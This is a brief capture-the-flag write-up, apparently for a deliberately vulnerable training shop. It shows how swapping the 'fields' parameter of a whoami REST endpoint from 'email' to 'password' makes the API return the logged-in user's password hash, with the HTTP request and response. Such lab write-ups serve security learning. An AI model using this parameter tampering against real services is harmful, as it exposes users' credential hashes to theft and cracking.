# Password Hash Leak

**Description**
Obtain the password (hash) of the currently logged-in user directly from a REST API endpoint.

Topic: Sensitive Data Exposure

## Solution

Finding an URI under `/rest` that might return an HASH of currently logged in user.

Saw many requests to `GET /rest/user/whoami?fields=email`.

Just tried chaing it to `password` -> meaning `GET /rest/user/whoami?fields=password` -> It reutrned the HASH

### Request
```python
GET /rest/user/whoami?fields=password HTTP/1.1
Authorization: ...
...
Connection: keep-alive
```

### Response
```python
HTTP/1.1 200 OK
...
Keep-Alive: timeout=5

{
    "user":{
        "password":"0192023a7bbd73250516f069df18b500"
    }
}
```